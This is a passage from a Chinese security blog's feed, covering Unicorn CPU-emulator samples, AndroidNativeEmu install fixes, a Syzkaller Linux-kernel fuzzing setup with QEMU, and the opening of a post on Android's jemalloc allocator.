</span><span style="color:#75715e"></span>  err <span style="color:#f92672">=</span> uc_emu_start(uc, ADDRESS, ADDRESS <span style="color:#f92672">+</span> <span style="color:#66d9ef">sizeof</span>(X86_CODE32) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>);
  <span style="color:#66d9ef">if</span> (err){
    printf(<span style="color:#e6db74">&#34;Failed on uc_emu_start() with error returned %u: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,
           err, uc_strerror(err));
  }
  <span style="color:#75715e">// 打印寄存器值
</span><span style="color:#75715e"></span>  printf(<span style="color:#e6db74">&#34;Emulation done. Below is the CPU context</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);

  uc_reg_read(uc, UC_X86_REG_ECX, <span style="color:#f92672">&amp;</span>r_ecx);
  uc_reg_read(uc, UC_X86_REG_EDX, <span style="color:#f92672">&amp;</span>r_edx);
  printf(<span style="color:#e6db74">&#34;&gt;&gt;&gt; ECX = 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, r_ecx);
  printf(<span style="color:#e6db74">&#34;&gt;&gt;&gt; EDX = 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, r_edx);

  uc_close(uc);

  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
}
</code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20200411000429.png" alt=""></p>
<p>官方给了很多测试<a href="https://github.com/unicorn-engine/unicorn/tree/master/samples">案例</a></p>
<p>python3:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> __future__ <span style="color:#f92672">import</span> print_function
<span style="color:#f92672">from</span> unicorn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
<span style="color:#f92672">from</span> unicorn.x86_const <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

X86_CODE32 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x4a</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">#INC ecx; DEC edx</span>

ADDRESS <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1000000</span>

<span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Emulate i386 code&#34;</span>)

<span style="color:#66d9ef">try</span>:
    <span style="color:#75715e">## 初始化模拟器为x86 32bit</span>
    mu <span style="color:#f92672">=</span> Uc(UC_ARCH_X86,UC_MODE_32)
    <span style="color:#75715e"># mu = Uc(UC_ARCH_ARM64,UC_MODE_64)</span>
    <span style="color:#75715e">## 2MB 的memory</span>
    mu<span style="color:#f92672">.</span>mem_map(ADDRESS,<span style="color:#ae81ff">2</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span><span style="color:#f92672">*</span><span style="color:#ae81ff">1024</span>)
    <span style="color:#75715e">## </span>
    mu<span style="color:#f92672">.</span>mem_write(ADDRESS,X86_CODE32)
    <span style="color:#75715e">##</span>
    mu<span style="color:#f92672">.</span>reg_write(UC_X86_REG_ECX,<span style="color:#ae81ff">0x1234</span>)
    mu<span style="color:#f92672">.</span>reg_write(UC_X86_REG_EDX,<span style="color:#ae81ff">0x7890</span>)
    <span style="color:#75715e">##</span>
    mu<span style="color:#f92672">.</span>emu_start(ADDRESS, ADDRESS <span style="color:#f92672">+</span> len(X86_CODE32))

    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Emulation done. Below is the CPU context&#34;</span>)

    r_ecx <span style="color:#f92672">=</span> mu<span style="color:#f92672">.</span>reg_read(UC_X86_REG_ECX)
    r_edx <span style="color:#f92672">=</span> mu<span style="color:#f92672">.</span>reg_read(UC_X86_REG_EDX)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt;&gt;&gt; ECX = 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>r_ecx)
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;&gt;&gt;&gt; EDX = 0x</span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>r_edx)

<span style="color:#66d9ef">except</span> UcError <span style="color:#66d9ef">as</span> e:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;ERROR: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span>e)
</code></pre></div><h3 id="0x03-一些基于unicorn的项目简单使用">0x03 一些基于unicorn的项目简单使用</h3>
<h4 id="androidnativeemuhttpsgithubcomp4nda0sandroidnativeemu"><a href="https://github.com/P4nda0s/AndroidNativeEmu">AndroidNativeEmu</a></h4>
<p>AndroidNativeEmu 让你能够跨平台模拟Android Native库函数，比如JNI_OnLoad、Java_XXX_XX等函数</p>
<p>这是看雪无名侠大佬二次修改一个版本，真的太强了。</p>
<ol>
<li>
<p>安装报错解决</p>
<p>安装有些坑。。</p>
<p>首先要求使用python3.7。之后</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">git https://github.com/AeonLucid/AndroidNativeEmu.git
pip install -r requirements.txt 
cd samples
<span style="color:#75715e"># 运行python example.py开始报错。。</span>
</code></pre></div><p>在win上先搞定<code>keystone-engine</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"></code></pre></div></li>
</ol>
<p>git clone <a href="https://github.com/keystone-engine/keystone">https://github.com/keystone-engine/keystone</a>
cd keystone/bindings/python
python setup.py install</p>
<pre><code>
[下载](http://www.keystone-engine.org/download/) `Windows - Core engine` x64

解压找到`keystone.dll` 放到`X:\location_to_python\Lib\site-packages\keystone\`

还有可能报`fail to load the dynamic library.`

下载 [vcredist_x64](https://www.microsoft.com/en-gb/download/details.aspx?id=40784) 安装。

之后直接`python example.py` 继续报`ModuleNotFoundError: No module named 'androidemu'`

加入代码

``` python
import sys
sys.path.append('../')
······
</code></pre><p>又报<code>FileNotFoundError: [Errno 2] No such file or directory: 	'samples/example_binaries/libc.so'</code></p>
<p>删掉代码里的 <code>samples/example_binaries/libc.so</code>的<code>samples/</code></p>
<p>能跑起来但是报错<code>unicorn.unicorn.UcError: Invalid instruction (UC_ERR_INSN_INVALID)</code></p>
<p>改成<code>emulator.load_library(&quot;example_binaries/libc.so&quot;, do_init=False)</code></p>
<p>就成功运行</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200413002530.png" alt=""></p>
<ol start="2">
<li>使用</li>
</ol>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> logging
<span style="color:#f92672">import</span> posixpath
<span style="color:#f92672">import</span> sys
sys<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>append(<span style="color:#e6db74">&#39;../&#39;</span>)
<span style="color:#f92672">from</span> unicorn <span style="color:#f92672">import</span> UcError, UC_HOOK_CODE, UC_HOOK_MEM_UNMAPPED
<span style="color:#f92672">from</span> unicorn.arm_const <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>

<span style="color:#f92672">from</span> androidemu.emulator <span style="color:#f92672">import</span> Emulator
<span style="color:#f92672">from</span> androidemu.java.java_class_def <span style="color:#f92672">import</span> JavaClassDef
<span style="color:#f92672">from</span> androidemu.java.java_method_def <span style="color:#f92672">import</span> java_method_def
<span style="color:#f92672">import</span> debug_utils

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span>(metaclass<span style="color:#f92672">=</span>JavaClassDef, jvm_name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;com/example/debugdemo/MainActivity&#39;</span>):

    <span style="color:#66d9ef">def</span> __init__(self):
        <span style="color:#66d9ef">pass</span>

    <span style="color:#a6e22e">@java_method_def</span>(name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;stringFromJNI&#39;</span>, signature<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;()Ljava/lang/String;&#39;</span>, native<span style="color:#f92672">=</span>True)
    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">string_from_jni</span>(self, mu):
        <span style="color:#66d9ef">pass</span>

    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">test</span>(self):
        <span style="color:#66d9ef">pass</span>

<span style="color:#75715e"># Configure logging</span>
logging<span style="color:#f92672">.</span>basicConfig(
    stream<span style="color:#f92672">=</span>sys<span style="color:#f92672">.</span>stdout,
    level<span style="color:#f92672">=</span>logging<span style="color:#f92672">.</span>DEBUG,
    format<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">%(asctime)s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%(levelname)7s</span><span style="color:#e6db74"> </span><span style="color:#e6db74">%(name)34s</span><span style="color:#e6db74"> | </span><span style="color:#e6db74">%(message)s</span><span style="color:#e6db74">&#34;</span>
)
logger <span style="color:#f92672">=</span> logging<span style="color:#f92672">.</span>getLogger(__name__)

<span style="color:#75715e">## 先创建java class</span>

<span style="color:#75715e">## 初始化emulater</span>
emulator <span style="color:#f92672">=</span> Emulator(
  vfs_root<span style="color:#f92672">=</span>posixpath<span style="color:#f92672">.</span>join(posixpath<span style="color:#f92672">.</span>dirname(__file__),<span style="color:#e6db74">&#34;vfs&#34;</span>),
  vfp_inst_set<span style="color:#f92672">=</span>True
)

<span style="color:#75715e">## 注册 java class</span>
emulator<span style="color:#f92672">.</span>java_classloader<span style="color:#f92672">.</span>add_class(MainActivity)

<span style="color:#75715e">## load libraries</span>
emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libdl.so&#34;</span>)
emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libc.so&#34;</span>)
emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libstdc++.so&#34;</span>)
emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libm.so&#34;</span>)

tar_lib <span style="color:#f92672">=</span> emulator<span style="color:#f92672">.</span>load_library(<span style="color:#e6db74">&#34;example_binaries/libtest.so&#34;</span>)

<span style="color:#75715e"># Show loaded modules.</span>
logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Loaded modules:&#34;</span>)

<span style="color:#66d9ef">for</span> module <span style="color:#f92672">in</span> emulator<span style="color:#f92672">.</span>modules:
    logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;=&gt; 0x</span><span style="color:#e6db74">%08x</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (module<span style="color:#f92672">.</span>base, module<span style="color:#f92672">.</span>filename))


<span style="color:#66d9ef">try</span>:
    <span style="color:#75715e">## Run JNI_OnLoad.</span>
    emulator<span style="color:#f92672">.</span>call_symbol(tar_lib, <span style="color:#e6db74">&#39;JNI_OnLoad&#39;</span>, emulator<span style="color:#f92672">.</span>java_vm<span style="color:#f92672">.</span>address_ptr, <span style="color:#ae81ff">0x00</span>)
    emulator<span style="color:#f92672">.</span>mu<span style="color:#f92672">.</span>hook_add(UC_HOOK_MEM_UNMAPPED, debug_utils<span style="color:#f92672">.</span>hook_unmapped)

    <span style="color:#75715e"># Do native stuff.</span>
    emulator<span style="color:#f92672">.</span>mu<span style="color:#f92672">.</span>hook_add(UC_HOOK_CODE, debug_utils<span style="color:#f92672">.</span>hook_code)
    main_activity <span style="color:#f92672">=</span> MainActivity()
    logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Response from JNI call: </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> main_activity<span style="color:#f92672">.</span>string_from_jni(emulator))

    <span style="color:#75715e"># Dump natives found.</span>
    logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Exited EMU.&#34;</span>)
    logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Native methods registered to MainActivity:&#34;</span>)

    <span style="color:#66d9ef">for</span> method <span style="color:#f92672">in</span> MainActivity<span style="color:#f92672">.</span>jvm_methods<span style="color:#f92672">.</span>values():
        <span style="color:#66d9ef">if</span> method<span style="color:#f92672">.</span>native:
            logger<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;- [0x</span><span style="color:#e6db74">%08x</span><span style="color:#e6db74">] </span><span style="color:#e6db74">%s</span><span style="color:#e6db74"> - </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> (method<span style="color:#f92672">.</span>native_addr, method<span style="color:#f92672">.</span>name, method<span style="color:#f92672">.</span>signature))

<span style="color:#66d9ef">except</span> UcError <span style="color:#66d9ef">as</span> e:
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Exit at </span><span style="color:#e6db74">%x</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> emulator<span style="color:#f92672">.</span>mu<span style="color:#f92672">.</span>reg_read(UC_ARM_REG_PC))
    <span style="color:#66d9ef">raise</span>
</code></pre></div><ul>
<li>samples 文件夹下几个具体的实例</li>
</ul>
<h4 id="unicorefuzzhttpsgithubcomfgsectunicorefuzz"><a href="https://github.com/fgsect/unicorefuzz">unicorefuzz</a></h4>
<p>合并到<a href="">AFL系列总结</a></p>
<h4 id="参考">参考</h4>
<ul>
<li>中文文档https://github.com/kabeor/Micro-Unicorn-Engine-API-Documentation</li>
<li><a href="https://github.com/unicorn-engine/unicorn">https://github.com/unicorn-engine/unicorn</a></li>
<li><a href="https://github.com/P4nda0s/AndroidNativeEmu">https://github.com/P4nda0s/AndroidNativeEmu</a></li>
<li><a href="https://app.yinxiang.com/fx/a6cc6633-a93f-4111-a06a-cccd5fa39e0f">https://app.yinxiang.com/fx/a6cc6633-a93f-4111-a06a-cccd5fa39e0f</a></li>
<li><a href="https://github.com/fgsect/unicorefuzz">https://github.com/fgsect/unicorefuzz</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Syzkaller</title>
            <link>https://kuekiko.top/posts/2020/04/syzkaller/</link>
            <pubDate>Fri, 10 Apr 2020 18:59:00 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2020/04/syzkaller/</guid>
            <description>0x00 介绍 syzkaller是google的安全研究人员开发并维护的内核fuzz工具。它主要是用go写的，也有少部分C代码，支持akaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windows等系统，发现的漏洞多达上千。
0x01 环境配置 环境要求：
  C/C++ 编译器
 GCC 6.1.0+    linux kernel
 编译 v4.6以后编译时确保CONFIG_KCOV=y 之前版本：这样添加支持 一些额外选项    VM 一般QEMU
 支持QEMU、kvmtool和GCE虚拟机、Android设备和Odroid C2开发板 需要进行通信：vm要提供网络支持 vm配置需要ssh服务器 要能执行ssh -i $SSHID -p $PORT root@localhost 需要将debugfs 挂在到 /sys/kernel/debug    Golang 安装
wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gztar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gzvim /etc/profilemkdir /usr/local/gopath# 添加export export GOROOT=/home/kuekiko/gorootexport GOPATH=/home/kuekiko/gopathexport PATH=$GOROOT/bin:$PATHexport PATH=$GOPATH/bin:$PATHsource etc/profile  syzkaller</description>
            <content type="html"><![CDATA[<ul>
<li>
<h3 id="0x00-介绍">0x00 介绍</h3>
<p><a href="https://github.com/google/syzkaller">syzkaller</a>是google的安全研究人员开发并维护的内核fuzz工具。它主要是用go写的，也有少部分C代码，支持akaros/fuchsia/linux/android/freebsd/netbsd/openbsd/windows等系统，发现的漏洞多达上千。</p>
<h3 id="0x01-环境配置">0x01 环境配置</h3>
<p><strong>环境要求</strong>：</p>
<ul>
<li>
<p>C/C++ 编译器</p>
<ul>
<li>GCC 6.1.0+</li>
</ul>
</li>
<li>
<p>linux kernel</p>
<ul>
<li>编译 v4.6以后编译时确保<code>CONFIG_KCOV=y</code> 之前版本：<a href="https://github.com/torvalds/linux/commit/5c9a8750a6409c63a0f01d51a9024861022f6593">这样</a>添加支持</li>
<li>一些额外<a href="https://github.com/google/syzkaller/blob/master/docs/linux/kernel_configs.md">选项</a></li>
</ul>
</li>
<li>
<p>VM 一般QEMU</p>
<ul>
<li>支持QEMU、kvmtool和GCE虚拟机、Android设备和Odroid C2开发板</li>
<li>需要进行通信：vm要提供网络支持</li>
<li>vm配置需要ssh服务器</li>
<li>要能执行<code>ssh -i  $SSHID -p $PORT root@localhost</code></li>
<li>需要将<code>debugfs</code> 挂在到 <code>/sys/kernel/debug</code></li>
</ul>
</li>
<li>
<p><a href="https://golang.org/">Golang</a> 安装</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">wget https://dl.google.com/go/go1.14.1.linux-amd64.tar.gz
tar -C ~/goroot -xzf go1.14.1.linux-amd64.tar.gz
vim /etc/profile
mkdir /usr/local/gopath
<span style="color:#75715e"># 添加export</span> 
export GOROOT<span style="color:#f92672">=</span>/home/kuekiko/goroot
export GOPATH<span style="color:#f92672">=</span>/home/kuekiko/gopath
export PATH<span style="color:#f92672">=</span>$GOROOT/bin:$PATH
export PATH<span style="color:#f92672">=</span>$GOPATH/bin:$PATH
source etc/profile
</code></pre></div></li>
<li>
<p>syzkaller</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># build</span>
go get -u -d github.com/google/syzkaller/...
cd $GOROOT/src/github.com/google/syzkaller/
make -j4
<span style="color:#75715e"># build之后在bin/下</span>
</code></pre></div><ul>
<li>如果要cross-OS/arch 进行测试的话，记得修改<code>TARGETOS</code>, <code>TARGETVMARCH</code> 和<code>TARGETARCH</code>参数再<code>make</code></li>
</ul>
</li>
</ul>
<h3 id="0x02-init-syzkaller">0x02 Init syzkaller</h3>
<p>生成镜像</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install debootstrap
cd gopath/src/github.com/google/syzkaller/tools/
<span style="color:#75715e"># 使用国内源 修改create-image.sh</span>
sudo debootstrap --include<span style="color:#f92672">=</span>$PREINSTALL_PKGS --components<span style="color:#f92672">=</span>main,contrib,non-free $RELEASE $DIR
<span style="color:#75715e"># 改成</span>
sudo debootstrap --include<span style="color:#f92672">=</span>$PREINSTALL_PKGS --components<span style="color:#f92672">=</span>main,contrib,non-free $RELEASE $DIR http://mirrors.163.com/debian/
./create-image.sh 
<span style="color:#75715e"># 选项 --distribution wheezy --feature full</span>
<span style="color:#75715e"># 生成了stretch.id_rsa stretch.id_rsa.pub stretch.img</span>
</code></pre></div><h5 id="编译启动-内核">编译启动 内核</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">export KERNEL<span style="color:#f92672">=</span>/home/kuekiko/linux_kernel
export IMG<span style="color:#f92672">=</span>/home/kuekiko/linux_kernel/img
export PATH<span style="color:#f92672">=</span>$KERNEL:$PATH
export PATH<span style="color:#f92672">=</span>$IMG:$PATH
<span style="color:#75715e"># 默认编译</span>
cd $KERNEL/xxx
make CC<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$GCC<span style="color:#e6db74">/bin/gcc&#34;</span> defconfig
make CC<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$GCC<span style="color:#e6db74">/bin/gcc&#34;</span> kvmconfig
<span style="color:#75715e"># 直接 make menuconfig</span> 
<span style="color:#75715e"># 编辑.config</span>
CONFIG_KCOV<span style="color:#f92672">=</span>y
CONFIG_DEBUG_INFO<span style="color:#f92672">=</span>y
CONFIG_KASAN<span style="color:#f92672">=</span>y
CONFIG_KASAN_INLINE<span style="color:#f92672">=</span>y
<span style="color:#75715e"># 新</span>
CONFIG_CONFIGFS_FS<span style="color:#f92672">=</span>y
CONFIG_SECURITYFS<span style="color:#f92672">=</span>y
  
make CC<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$GCC<span style="color:#e6db74">/bin/gcc&#34;</span> olddefconfig
make CC<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;</span>$GCC<span style="color:#e6db74">/bin/gcc&#34;</span> -j4
</code></pre></div><h5 id="qemu">qemu</h5>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">qemu-system-x86_64 <span style="color:#ae81ff">\</span>
  -kernel $KERNEL/arch/x86/boot/bzImage <span style="color:#ae81ff">\</span>
  -append <span style="color:#e6db74">&#34;console=ttyS0 root=/dev/sda earlyprintk=serial&#34;</span><span style="color:#ae81ff">\</span>
  -hda $IMAGE/stretch.img <span style="color:#ae81ff">\</span>
  -net user,hostfwd<span style="color:#f92672">=</span>tcp::10021-:22 -net nic <span style="color:#ae81ff">\</span>
  -enable-kvm <span style="color:#ae81ff">\</span>
  -nographic <span style="color:#ae81ff">\</span>
  -m 2G <span style="color:#ae81ff">\</span>
  -smp <span style="color:#ae81ff">2</span> <span style="color:#ae81ff">\</span>
  -pidfile vm.pid <span style="color:#ae81ff">\</span>
  2&gt;&amp;<span style="color:#ae81ff">1</span> | tee vm.log
</code></pre></div><p>ssh连接</p>
<p><code>ssh -i $IMG/stretch.id_rsa -p 10021 -o &quot;StrictHostKeyChecking no&quot; root@localhost</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200417165654.png" alt=""></p>
<p>kill qemu 使用<code>kill $(cat vm.pid)</code></p>
<h3 id="0x03-start-fuzzing">0x03 Start Fuzzing</h3>
<p>添加配置文件my.cfg</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
  <span style="color:#f92672">&#34;target&#34;</span>: <span style="color:#e6db74">&#34;linux/amd64&#34;</span>,
  <span style="color:#f92672">&#34;http&#34;</span>: <span style="color:#e6db74">&#34;127.0.0.1:56741&#34;</span>,
  <span style="color:#f92672">&#34;workdir&#34;</span>: <span style="color:#e6db74">&#34;$GOPATH/src/github.com/google/syzkaller/workdir&#34;</span>,
  <span style="color:#f92672">&#34;kernel_obj&#34;</span>: <span style="color:#e6db74">&#34;$KERNEL&#34;</span>,
  <span style="color:#f92672">&#34;image&#34;</span>: <span style="color:#e6db74">&#34;$IMAGE/stretch.img&#34;</span>,
  <span style="color:#f92672">&#34;sshkey&#34;</span>: <span style="color:#e6db74">&#34;$IMAGE/stretch.id_rsa&#34;</span>,
  <span style="color:#f92672">&#34;syzkaller&#34;</span>: <span style="color:#e6db74">&#34;$GOPATH/src/github.com/google/syzkaller&#34;</span>,
  <span style="color:#f92672">&#34;procs&#34;</span>: <span style="color:#ae81ff">4</span>,
  <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;qemu&#34;</span>,
  <span style="color:#f92672">&#34;vm&#34;</span>: {
      <span style="color:#f92672">&#34;count&#34;</span>: <span style="color:#ae81ff">4</span>,
      <span style="color:#f92672">&#34;kernel&#34;</span>: <span style="color:#e6db74">&#34;$KERNEL/arch/x86/boot/bzImage&#34;</span>,
      <span style="color:#f92672">&#34;cpu&#34;</span>: <span style="color:#ae81ff">2</span>,
      <span style="color:#f92672">&#34;mem&#34;</span>: <span style="color:#ae81ff">2048</span>
  }
}
</code></pre></div><p>启动fuzzing</p>
<p><code>./bin/syz-manager -config=my.cfg</code></p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200417185540.png" alt=""></p>
<p>浏览器打开http://127.0.0.1:56741/</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200417185612.png" alt=""></p>
<p>虚拟机性能太垃圾，太慢了 fuzzing半天没也啥crashes。还是得用服务器。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200417190242.png" alt=""></p>
<p>挂机了大概3小时，出了几个没啥用的crach。</p>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200417205533.png" alt=""></p>
<h3 id="0x04-总结">0x04 总结</h3>
<p>还有很多选项可以开启，没试。</p>
<p>看看实现源码，还有就是之后试试Fuzzing Android</p>
<h4 id="参考">参考</h4>
<ul>
<li><a href="https://github.com/google/syzkaller">https://github.com/google/syzkaller</a></li>
<li><a href="https://www.freebuf.com/sectool/142969.html">https://www.freebuf.com/sectool/142969.html</a></li>
<li><a href="http://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/">http://blog.douluodalu.wang/2020/03/22/syz-fuzz%E5%88%9D%E6%8E%A2/</a></li>
<li><a href="https://github.com/google/syzkaller/blob/master/docs/linux/setup.md">https://github.com/google/syzkaller/blob/master/docs/linux/setup.md</a></li>
</ul>
</li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>Android之jemalloc</title>
            <link>https://kuekiko.top/posts/2020/04/android%E4%B9%8Bjemalloc/</link>
            <pubDate>Sun, 05 Apr 2020 18:18:59 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2020/04/android%E4%B9%8Bjemalloc/</guid>
            <description>0x00 简单介绍 想调一个CVE、发现对jemalloc 了解太少。重新复习复习jemalloc，做个记录。
jemalloc最初是2005年 Jason Evans开发的新一代内存分配器， 之后没多久被添加到FreeBSD的libc中的默认内存分配器，用来替代原来的phkmalloc。2007年 Firefox Mozilla项目的独立版本也将jemalloc作为主要的分配器。2009年，Facebook 的后端项目也广泛使用jemalloc。2014年，Android 5 开始采用jemalloc作为主要的内存分配器，不过部分Android5/6依然能看到dlmalloc和jemalloc两者并存。
jemalloc的一些特性与设计原则：
 强大的多核/多线程分配能力. 最小化的元数据开销 基于每个线程进行缓存，避免了同步问题。 避免了连续分配内存的碎片化问题。 简洁高效  0x01 结构  jemalloc对内存划分按照如下由高到低的顺序:
   内存是由一定数量的arenas进行管理. 一个arena被分割成若干chunks, 后者主要负责记录bookkeeping（记录信息）. chunk内部又包含着若干runs, 作为分配小块内存的基本单元. run由pages组成, 最终被划分成一定数量的regions 对于small size的分配请求来说, 这些region就相当于user memory.   arenas 对于Android来说：
限制了只使用两个arenas,每个带有一个lock。这意味着，不同线程尝试分配内存时，会循环、平均分配至两个arena，确保两个arena有大致相等的进程数量。只有在相同的arena中分配内存时才需要获取lock。
#/android.bpandroid_product_variables = {// Only enable the tcache on non-svelte configurations, to save PSS. malloc_not_svelte: {cflags: [&amp;#34;-UANDROID_MAX_ARENAS&amp;#34;,&amp;#34;-DANDROID_MAX_ARENAS=2&amp;#34;,&amp;#34;-DJEMALLOC_TCACHE&amp;#34;,&amp;#34;-DANDROID_TCACHE_NSLOTS_SMALL_MAX=8&amp;#34;,&amp;#34;-DANDROID_TCACHE_NSLOTS_LARGE=16&amp;#34;,],},}用shadow查看arenas</description>
            <content type="html"><![CDATA[<h3 id="0x00-简单介绍">0x00 简单介绍</h3>
<p>想调一个CVE、发现对jemalloc 了解太少。重新复习复习jemalloc，做个记录。</p>
<p>jemalloc最初是2005年 Jason Evans开发的新一代内存分配器， 之后没多久被添加到FreeBSD的libc中的默认内存分配器，用来替代原来的phkmalloc。2007年 Firefox Mozilla项目的独立版本也将jemalloc作为主要的分配器。2009年，Facebook 的后端项目也广泛使用jemalloc。2014年，Android 5 开始采用jemalloc作为主要的内存分配器，不过部分Android5/6依然能看到dlmalloc和jemalloc两者并存。</p>
<p>jemalloc的一些特性与设计原则：</p>
<ul>
<li>强大的多核/多线程分配能力.</li>
<li>最小化的元数据开销</li>
<li>基于每个线程进行缓存，避免了同步问题。</li>
<li>避免了连续分配内存的碎片化问题。</li>
<li>简洁高效</li>
</ul>
<h3 id="0x01-结构">0x01 结构</h3>
<p><img src="https://my-md-1253484710.file.myqcloud.com/20200403011045.png" alt="结构图"></p>
<blockquote>
<p>jemalloc对内存划分按照如下<strong>由高到低</strong>的顺序:</p>
</blockquote>
<blockquote>
<ol>
<li>内存是由一定数量的arenas进行管理.</li>
<li>一个arena被分割成若干chunks, 后者主要负责记录bookkeeping（记录信息）.</li>
<li>chunk内部又包含着若干runs, 作为分配小块内存的基本单元.</li>
<li>run由pages组成, 最终被划分成一定数量的regions</li>
<li>对于small size的分配请求来说, 这些region就相当于user memory.</li>
</ol>
</blockquote>
<h5 id="arenas">arenas</h5>
<p>对于Android来说：</p>
<p>限制了只使用两个arenas,每个带有一个lock。这意味着，不同线程尝试分配内存时，会循环、平均分配至两个arena，确保两个arena有大致相等的进程数量。只有在相同的arena中分配内存时才需要获取lock。</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#/android.bp
</span><span style="color:#75715e"></span>android_product_variables <span style="color:#f92672">=</span> {
    <span style="color:#75715e">// Only enable the tcache on non-svelte configurations, to save PSS.
</span><span style="color:#75715e"></span>    malloc_not_svelte: {
        cflags: [
            <span style="color:#e6db74">&#34;-UANDROID_MAX_ARENAS&#34;</span>,
            <span style="color:#e6db74">&#34;-DANDROID_MAX_ARENAS=2&#34;</span>,
